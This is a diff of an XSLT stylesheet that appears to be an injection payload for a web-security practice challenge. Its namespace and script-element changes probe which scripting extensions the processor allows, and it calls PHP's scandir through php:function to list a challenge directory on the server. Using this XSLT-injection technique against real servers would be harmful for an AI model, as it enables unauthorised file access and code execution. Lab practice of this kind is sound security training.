@@ -1,11 +1,11 @@
 <xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
 xmlns:php="http://php.net/xsl"
-xmlns:func="http://exslt.org/functions"
+xmlns:msxsl="urn:schemas-microsoft-com:xslt"
 >	
-<func:script language="javascript" >
+<script language="javascript" >
 function test(){return "hello world!";}
-</func:script>
+</script>
 <xsl:template match="/">	
 <xsl:param  name="shandle"    select="php:function('scandir','/challenge/web-serveur/ch50')" disable-output-escaping="yes"/>
 <xsl:param  name="strscand"   select="javascript:test()" disable-output-escaping="yes"/> 
